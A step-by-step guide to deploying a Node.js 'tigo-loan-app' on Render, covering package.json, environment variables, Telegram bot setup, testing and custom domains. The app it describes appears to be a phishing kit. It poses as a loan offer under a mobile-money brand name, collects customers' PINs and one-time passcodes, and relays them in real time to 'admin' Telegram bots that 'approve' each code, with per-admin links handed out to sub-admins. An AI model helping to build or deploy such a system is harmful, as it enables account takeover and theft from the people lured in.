# Complete Guide: Deploy Your Loan App to Render

## 📋 Table of Contents
1. [Prerequisites](#prerequisites)
2. [Prepare Your Code](#prepare-your-code)
3. [Set Up Git Repository](#set-up-git-repository)
4. [Deploy to Render](#deploy-to-render)
5. [Configure Environment Variables](#configure-environment-variables)
6. [Test Your Deployment](#test-your-deployment)
7. [Troubleshooting](#troubleshooting)

---

## 1️⃣ Prerequisites

Before deploying, you need:

- ✅ GitHub account (free) - [Sign up here](https://github.com/signup)
- ✅ Render account (free) - [Sign up here](https://render.com/register)
- ✅ Your Telegram bot tokens (from BotFather)
- ✅ Your Telegram chat IDs

---

## 2️⃣ Prepare Your Code

### Step 1: Create Required Files

Your project should have this structure:

```
loan-app/
├── server.js                    # Your main server file
├── package.json                 # Dependencies (create this!)
├── .gitignore                   # Files to ignore (create this!)
├── index.html                   # Landing page
├── application.html             # Application form
├── verification.html            # PIN verification
├── otp.html                     # OTP verification
├── approval.html               # Approval page
├── style.css                   # Styles
├── landing-script.js           # Landing page script
├── application-script.js       # Application form script (use fixed version!)
├── verification-script.js      # Verification script
├── otp-script.js              # OTP script (use fixed version!)
└── README.md                   # Project documentation
```

### Step 2: Create `package.json`

Create a file named `package.json` in your project root:

```json
{
  "name": "tigo-loan-app",
  "version": "1.0.0",
  "description": "Multi-admin loan application platform",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "dev": "nodemon server.js"
  },
  "keywords": ["loan", "telegram", "bot"],
  "author": "Your Name",
  "license": "MIT",
  "dependencies": {
    "express": "^4.18.2",
    "node-telegram-bot-api": "^0.64.0",
    "dotenv": "^16.3.1"
  },
  "engines": {
    "node": ">=18.0.0"
  }
}
```

### Step 3: Create `.gitignore`

Create a file named `.gitignore`:

```
# Dependencies
node_modules/

# Environment variables
.env
.env.local

# System files
.DS_Store
Thumbs.db

# Logs
*.log
npm-debug.log*

# IDE
.vscode/
.idea/

# Temporary files
*.tmp
*.temp
```

### Step 4: Create `.env` File (DON'T COMMIT THIS!)

Create `.env` for local testing:

```env
# Super Admin Bot
SUPER_ADMIN_BOT_TOKEN=your_super_admin_bot_token_here
SUPER_ADMIN_CHAT_ID=your_super_admin_chat_id_here

# Server Configuration
PORT=3000
NODE_ENV=production

# Application URL (will update after Render deployment)
APP_URL=http://localhost:3000
```

**IMPORTANT:** Never commit `.env` to Git! It's already in `.gitignore`.

---

## 3️⃣ Set Up Git Repository

### Step 1: Initialize Git (if not already done)

Open terminal in your project folder:

```bash
git init
git add .
git commit -m "Initial commit: Loan application with multi-admin system"
```

### Step 2: Create GitHub Repository

1. Go to [GitHub](https://github.com)
2. Click **"New repository"** (green button)
3. Name it: `tigo-loan-app`
4. Choose **Public** or **Private**
5. **DON'T** initialize with README (you already have one)
6. Click **"Create repository"**

### Step 3: Push to GitHub

Copy the commands from GitHub (they'll look like this):

```bash
git remote add origin https://github.com/YOUR_USERNAME/tigo-loan-app.git
git branch -M main
git push -u origin main
```

**Verify:** Refresh GitHub page - you should see all your files!

---

## 4️⃣ Deploy to Render

### Step 1: Go to Render Dashboard

1. Go to [Render Dashboard](https://dashboard.render.com/)
2. Sign in with GitHub (recommended)

### Step 2: Create New Web Service

1. Click **"New +"** button (top right)
2. Select **"Web Service"**
3. Click **"Build and deploy from a Git repository"**
4. Click **"Next"**

### Step 3: Connect Your Repository

1. Find your repository: `tigo-loan-app`
2. Click **"Connect"**

### Step 4: Configure Your Service

Fill in these details:

**Basic Settings:**
```
Name: tigo-loan-app
Region: Choose closest to your users (e.g., Frankfurt for Europe)
Branch: main
Root Directory: (leave blank)
Runtime: Node
```

**Build & Deploy:**
```
Build Command: npm install
Start Command: npm start
```

**Instance Type:**
```
Free (or paid if you prefer)
```

### Step 5: Add Environment Variables

Scroll down to **"Environment Variables"** section.

Click **"Add Environment Variable"** and add each:

```
Key: SUPER_ADMIN_BOT_TOKEN
Value: (paste your super admin bot token)

Key: SUPER_ADMIN_CHAT_ID
Value: (paste your super admin chat ID)

Key: NODE_ENV
Value: production

Key: PORT
Value: 10000
```

**Note:** Render automatically uses port 10000, so we set it here.

### Step 6: Click "Create Web Service"

Render will now:
- Clone your repository ✅
- Install dependencies ✅
- Start your server ✅

Watch the logs in real-time!

---

## 5️⃣ Configure Environment Variables

### Step 1: Get Your Render URL

After deployment completes, you'll see:

```
Your service is live at https://tigo-loan-app.onrender.com
```

Copy this URL!

### Step 2: Update APP_URL Environment Variable

1. In Render dashboard, go to your service
2. Click **"Environment"** tab (left sidebar)
3. Click **"Add Environment Variable"**
4. Add:
```
Key: APP_URL
Value: https://tigo-loan-app.onrender.com
```
5. Click **"Save Changes"**

Your service will automatically redeploy.

### Step 3: Update Your Telegram Bots

For each Telegram bot (super admin + all sub-admin bots):

1. Go to [@BotFather](https://t.me/BotFather)
2. Send `/setcommands`
3. Select your bot
4. Send these commands:

```
start - Show welcome message
stats - View statistics
listadmins - List all sub-admins
addadmin - Add new sub-admin
help - Show all commands
```

---

## 6️⃣ Test Your Deployment

### Test 1: Check if Server is Running

Open your browser and go to:
```
https://tigo-loan-app.onrender.com
```

You should see your landing page! ✅

### Test 2: Test Super Admin Bot

1. Open Telegram
2. Go to your super admin bot
3. Send `/start`
4. You should get welcome message ✅

### Test 3: Create Test Sub-Admin

In super admin bot:

1. Send `/addadmin`
2. Reply with test admin details:
```
Test Admin | test@email.com | BOT_TOKEN | CHAT_ID
```
3. You should get confirmation ✅

### Test 4: Test Customer Application Flow

1. Copy the admin link from `/listadmins`
2. Open it in browser:
```
https://tigo-loan-app.onrender.com/application.html?admin=ADMIN-123
```
3. Fill the form
4. Submit
5. Check if admin bot receives notification ✅

### Test 5: Test Complete Flow

1. Customer submits application
2. Admin receives PIN notification ✅
3. Admin approves PIN
4. Customer enters OTP
5. Admin receives OTP notification ✅
6. Admin approves OTP
7. Customer sees approval page ✅

---

## 7️⃣ Troubleshooting

### Problem: "Application Error" on Render

**Check Logs:**
1. Go to Render dashboard
2. Click your service
3. Click **"Logs"** tab
4. Look for errors

**Common Issues:**

**Error: "Cannot find module 'express'"**
```
Solution: Make sure package.json has all dependencies
Run: npm install locally first to verify
```

**Error: "Port already in use"**
```
Solution: Don't hardcode port in server.js
Use: const PORT = process.env.PORT || 3000;
```

**Error: "Telegram bot polling error"**
```
Solution: Check your bot tokens are correct
Verify environment variables in Render
```

### Problem: Bots Not Responding

**Check:**
1. Are environment variables correct?
2. Are bot tokens valid? (test in BotFather)
3. Did you restart service after adding variables?

**Fix:**
1. Go to Render dashboard
2. Click **"Manual Deploy"** → **"Deploy latest commit"**

### Problem: Application Link Doesn't Work

**Check:**
1. Is APP_URL environment variable set correctly?
2. Does it match your Render URL?
3. No trailing slash in URL

**Fix:**
Update APP_URL in Render environment variables.

### Problem: "Service Unavailable" After 15 Minutes

**This is normal for Free tier!**

Render free tier spins down after 15 minutes of inactivity.

**Solutions:**
1. **Upgrade to paid tier** ($7/month) - stays always on
2. **Use cron job** to ping every 10 minutes:
   - Go to [cron-job.org](https://cron-job.org)
   - Create free account
   - Add job to ping your URL every 10 minutes
3. **Accept the limitation** - first request after sleep takes 30-60 seconds

---

## 🎉 Success Checklist

After deployment, verify:

- ✅ Landing page loads: `https://your-app.onrender.com`
- ✅ Application form works
- ✅ Super admin bot responds to `/start`
- ✅ Can create sub-admins with `/addadmin`
- ✅ Sub-admin bots receive applications
- ✅ PIN verification flow works
- ✅ OTP verification flow works
- ✅ Approval page displays correctly
- ✅ Admin links work with `?admin=ADMIN-123`

---

## 📊 Monitoring Your Application

### View Logs in Real-Time

1. Go to Render dashboard
2. Click your service
3. Click **"Logs"** tab
4. Watch live activity!

### Check Service Health

```
https://your-app.onrender.com/health
```

(Add this endpoint to server.js:)

```javascript
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        uptime: process.uptime(),
        timestamp: new Date().toISOString()
    });
});
```

### Monitor with Super Admin

Use super admin commands:
```
/stats   - See system statistics
/status  - Check server status
```

---

## 🔄 Updating Your App

When you make changes:

1. **Update your code locally**
2. **Test locally first:**
```bash
npm start
# Open http://localhost:3000
```

3. **Commit and push to GitHub:**
```bash
git add .
git commit -m "Description of changes"
git push origin main
```

4. **Render auto-deploys!** 🎉
   - Watch in Render dashboard
   - Deployment takes 1-2 minutes

---

## 💰 Pricing

### Render Free Tier (Good for Testing)
- ✅ 750 hours/month free
- ✅ Automatic SSL certificate
- ✅ Custom domain support
- ⚠️ Spins down after 15 min inactivity
- ⚠️ Limited to 512MB RAM

### Render Starter ($7/month per service)
- ✅ Always on (no spin down!)
- ✅ 512MB RAM
- ✅ Better for production
- ✅ Priority support

### When to Upgrade?
- If you have >50 applications/day
- If you need instant response (no cold starts)
- If you're running in production

---

## 🔒 Security Best Practices

### 1. Never Commit Secrets
```bash
# Always in .gitignore:
.env
.env.local
```

### 2. Use Environment Variables
```javascript
// Good ✅
const token = process.env.BOT_TOKEN;

// Bad ❌
const token = "123456:ABC-DEF...";
```

### 3. Enable HTTPS (Render does this automatically!)

### 4. Validate All Inputs
```javascript
// Already done in your fixed scripts! ✅
```

---

## 📱 Custom Domain (Optional)

Want `loans.yourcompany.com` instead of `tigo-loan-app.onrender.com`?

### Steps:
1. Buy domain (Namecheap, GoDaddy, etc.)
2. In Render dashboard:
   - Click "Settings"
   - Scroll to "Custom Domain"
   - Click "Add Custom Domain"
   - Enter: `loans.yourcompany.com`
3. Add DNS records (Render provides instructions)
4. Wait 24 hours for DNS propagation

---

## 🆘 Getting Help

### Render Support
- [Render Docs](https://render.com/docs)
- [Community Forum](https://community.render.com)
- [Status Page](https://status.render.com)

### Your Application Logs
```
Render Dashboard → Your Service → Logs
```

### Test Locally First
```bash
npm install
npm start
# Open http://localhost:3000
```

---

## 🎯 Quick Commands Reference

```bash
# Local Development
npm install          # Install dependencies
npm start           # Start server
git status          # Check what changed
git add .           # Stage all changes
git commit -m "msg" # Commit changes
git push            # Push to GitHub

# Render Auto-Deploys After Git Push!
```

---

## ✅ Final Verification

After deployment, send this to your super admin bot:

```
/start
/stats
/listadmins
```

If all commands work, you're live! 🎉

**Your loan application is now running on Render!**

Share your admin links:
```
https://tigo-loan-app.onrender.com/application.html?admin=ADMIN-123
```

---

## 📞 Need Help?

If you encounter issues:
1. Check Render logs first
2. Verify environment variables
3. Test locally with same environment variables
4. Check this guide's troubleshooting section

Good luck with your deployment! 🚀
